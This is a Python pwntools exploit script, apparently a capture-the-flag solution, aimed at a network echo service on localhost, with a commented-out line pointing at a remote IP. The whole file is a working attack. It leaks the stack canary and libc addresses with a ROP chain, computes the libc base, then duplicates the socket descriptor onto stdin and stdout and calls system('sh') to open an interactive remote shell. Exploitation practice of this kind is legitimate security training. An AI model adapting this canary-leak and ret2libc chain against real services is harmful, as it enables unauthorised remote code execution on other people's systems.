#!/usr/bin/env python
# -*- coding: utf8 -*-
from pwn import * # pip install pwntools
import sys

ip = '127.0.0.1'
port = 8181
reip = '110.10.212.130'
report = 8888

r = remote(ip, port)
#r = remote(reip, report)

# Default address & libc setting
echo_select = 0x08048a71
socket_send = 0x080488b1
sigemptyset_got = 0x0804b048
fd = 0x0804b1b8
pop1 = 0x08048589
pop2 = 0x08048b84
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('libc.so')

def echo(payload):
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil(':')
    r.send(payload)

# Leak canary
echo('A' * 40 + '\n')
r.recvline()
canary = r.recv(3)
canary = u32('\x00' + canary)
log.info(hex(canary))


# Leak libc function address and File Descripter
rop1 = [socket_send, pop1, sigemptyset_got, socket_send, echo_select, fd]
payload = 'A'*40 + p32(canary) +'A'*12 + ''.join(map(p32, rop1))
echo(payload + '\n')
r.recvuntil('>') 
r.sendline('3') # Use exit to ret to rop
r.recv()
sig = u32(r.recv(4))
listen = u32(r.recv(4))
atoi = u32(r.recv(4))
r.recv()
fd = ord(r.recv(1))
log.info('sigemptyset : ' + hex(sig) + '\n' + 
        'listen : ' + hex(listen) + '\n' +
        'atoi : ' + hex(atoi) + '\n' +
        'fd : ' + hex(fd))
base = atoi - libc.symbols['atoi']
dup2 = base + libc.symbols['dup2']
system = 0x08048620
read = base + libc.symbols['read']
log.info('base : ' + hex(base))
sh = base + next(libc.search('sh\x00'))


# Duplicate fd and stdout & stdin(in order to use shell)
rop2 = [dup2, pop2, fd, 1,
        dup2, pop2, fd, 0,
        system, 0xdeadbeef, sh]
payload = 'A'*40 + p32(canary) + 'A'*12 + ''.join(map(p32, rop2))
echo(payload)

# Use exit to ret to rop2
sleep(0.1)
r.sendline('3')

r.interactive()
